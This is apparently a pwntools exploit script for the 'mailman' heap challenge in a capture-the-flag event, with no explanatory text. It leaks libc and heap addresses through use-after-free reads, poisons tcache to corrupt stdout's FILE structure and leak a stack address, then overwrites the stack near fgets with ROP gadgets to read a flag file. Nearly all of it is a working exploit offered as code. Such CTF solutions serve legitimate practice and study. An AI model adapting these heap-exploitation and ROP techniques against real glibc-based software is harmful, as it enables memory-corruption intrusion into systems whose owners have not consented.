from pwn import *

exe = ELF("./vuln_patched")
libc = ELF("./libc.so.6")

context.binary = exe
def GDB():
    gdb.attach(p,gdbscript='''
               b*fgets+135
    c
    ''')

if args.REMOTE:
    p = remote("mailman.chal.imaginaryctf.org", 1337)
else:
    p = process([exe.path])
    GDB()

def add(index,size,data):
    p.sendlineafter(b"> ",b"1")
    p.sendlineafter(b"idx: ",f"{index}".encode())
    p.sendlineafter(b"letter size: ",f"{size}".encode())
    p.sendlineafter(b"content: ",data)

def free(index):
    p.sendlineafter(b"> ",b"2")
    p.sendlineafter(b"idx: ",f"{index}".encode())
def show(index):
    p.sendlineafter(b"> ",b"3")
    p.sendlineafter(b"idx: ",f"{index}".encode())
##########leak libc######
add(0,0x4f8,b"AAAA")
add(1,0x58,b"a")
add(2,0x4f8,b"flag.txt\x00")
free(0)
show(0)
libc.address=int.from_bytes(p.recvline()[:-1],"little")-0x219ce0
log.info('[+]LIBC BASE:'+hex(libc.address))

#####leak heap#####
free(1)
show(1)
heap=(int.from_bytes(p.recvline()[:-1],"little")<<12)-0x1000
log.info('[+]Heap Base:'+hex(heap))

for i in range(1,0x10):
    add(i,0x78,b"A"*0x27)
for i in range(1,0xe):
    free(i)
add(1,0x4f8,b"A")
for i in range(3):
    add(0xa,0x78,b"A")
    free(0xa)

free(0xe)
free(0xf)
free(1)

add(0xe,0x1f8,b"A"*0x70+flat(0,0x81))
for i in range(4):
    add(1,0x78,b"BATMAN")
free(0xf)
free(0xe)

payload=b"A"*0x70+flat(0,0x81)
payload+=flat(
    ((heap+0x2320)>>12)^(libc.sym['_IO_2_1_stderr_']+208),
)

add(0xe,0x1f8,payload)
add(0,0x78,b"BATMAN")
payload=flat(
    0,libc.sym['_IO_file_jumps'],
    0xfbad1800 ,0xfbad1800 ,0xfbad1800 ,0xfbad1800 ,
    libc.sym['environ'],libc.sym['environ']+8,p64(libc.sym['_IO_2_1_stdout_']+131)*2,p64(libc.sym['_IO_2_1_stdout_']+132),
)

add(0,0x78,payload)
stack=int.from_bytes(p.recv(8),"little")
log.info('[+]Stack:'+hex(stack))
target=stack-0x168
fgets = target
log.info('[+]fgets:'+hex(fgets))
fakechunk=fgets-0x18-0x40


payload=b"A"*0x70+flat(0,0x301)
free(0xe)
add(0xe,0x1f8,payload)

add(10,0x2f8,b"BATMAN")
free(10)
free(0xf)
free(0xe)
payload=b"A"*0x70+flat(0,0x301)
payload+=flat(
    ((heap+0x2320)>>12)^(fgets-0x58),
)
poprdi=libc.address+0x000000000002a3e5
poprax=libc.address+0x0000000000045eb0
poprsi=libc.address+0x000000000002be51
poprdx=libc.address+0x000000000011f497
syscall=libc.address+0x0000000000091396
add(0xe,0x1f8,payload)
add(0,0x2f8,b"BATMAN")

ret=libc.address+0x0000000000029cd6

input()
getflag = add(0,0x2f8,flat(stack, stack, 0 , stack, stack, libc.sym.fgets+144, 0, stack + 0x20e, stack + 0x10, ret, ret))
p.interactive()



